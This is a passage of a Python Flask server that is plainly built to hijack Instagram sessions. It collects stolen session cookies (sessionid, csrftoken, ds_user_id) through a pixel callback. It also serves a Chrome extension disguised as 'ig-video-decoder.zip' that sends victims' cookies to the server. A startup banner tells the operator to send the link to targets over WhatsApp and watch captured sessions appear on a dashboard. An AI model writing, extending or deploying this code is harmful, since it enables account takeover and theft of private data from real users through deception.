    record["has_instagram_session"] = "sessionid" in all_data
    record["instagram_data"] = {k: v for k, v in all_data.items() 
                                if k in ["sessionid", "ds_user_id", "csrftoken", "ig_did", "mid"]}
    
    captured_sessions.append(record)
    
    if record["has_instagram_session"]:
        print(f"\n🔴🔴🔴 REAL INSTAGRAM SESSIONID CAPTURED!")
        print(f"   sessionid = {all_data['sessionid']}")
        print(f"   IP: {record['ip']}")
        print(f"   Source: {record['source']}")
        print(f"   Total captures: {len(captured_sessions)}")
    
    return jsonify({
        "status": "ok", 
        "captured": bool(all_data),
        "has_session": record["has_instagram_session"]
    })

@app.route("/extension-callback")
def extension_callback():
    """Receive cookies from the browser extension."""
    name = request.args.get("name", "")
    value = request.args.get("value", "")
    domain = request.args.get("domain", "")
    
    if name and value:
        record = {
            "id": str(uuid.uuid4())[:8],
            "timestamp": datetime.datetime.now().isoformat(),
            "ip": request.remote_addr,
            "source": "extension",
            "extension_data": {name: value},
            "domain": domain,
            "parsed": {},
            "has_instagram_session": (name == "sessionid"),
            "instagram_data": {name: value} if name in ["sessionid", "ds_user_id", "csrftoken", "ig_did", "mid"] else {}
        }
        
        captured_sessions.append(record)
        
        if name == "sessionid":
            print(f"\n🔴🔴🔴 EXTENSION STOLE Instagram sessionid!")
            print(f"   sessionid = {value}")
            print(f"   IP: {record['ip']}")
    
    # Return 1x1 transparent pixel
    return "", 200, {"Content-Type": "image/gif", 
                     "Cache-Control": "no-cache, no-store, must-revalidate"}

@app.route("/download-extension")
def download_extension():
    """Generate and serve the Chrome extension ZIP."""
    extension_files = {}
    
    # Fix the background.js to use the actual server URL
    bg = EXTENSION_BACKGROUND.replace(
        'https://YOUR-SERVER.onrender.com',
        request.host_url.rstrip("/")
    ).replace(
        'window.location.origin',
        f'"{request.host_url.rstrip("/")}"'
    )
    
    extension_files["manifest.json"] = json.dumps(EXTENSION_MANIFEST, indent=2)
    extension_files["background.js"] = bg
    extension_files["content.js"] = EXTENSION_CONTENT
    
    # Create ZIP
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        for filename, content in extension_files.items():
            zf.writestr(filename, content)
    
    buf.seek(0)
    
    return send_file(
        buf,
        mimetype='application/zip',
        as_attachment=True,
        download_name='ig-video-decoder.zip'
    )

@app.route("/clear", methods=["POST"])
def clear():
    captured_sessions.clear()
    return jsonify({"status": "cleared"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"\n{'='*60}")
    print(f"  🔴 REAL INSTAGRAM SESSION HIJACKING")
    print(f"{'='*60}")
    print(f"\n  📌 Send this link:")
    print(f"     http://localhost:{port}")
    print(f"\n  📌 Dashboard:")
    print(f"     http://localhost:{port}/dashboard")
    print(f"\n  📌 How it works:")
    print(f"     1. Send link to phone via WhatsApp")
    print(f"     2. Phone opens in Instagram browser (WebView)")
    print(f"     3. Attempts direct cookie extraction")
    print(f"     4. OR downloads extension for desktop")
    print(f"     5. sessionid appears on dashboard!")
    print(f"{'='*60}\n")
    app.run(host="0.0.0.0", port=port, debug=True)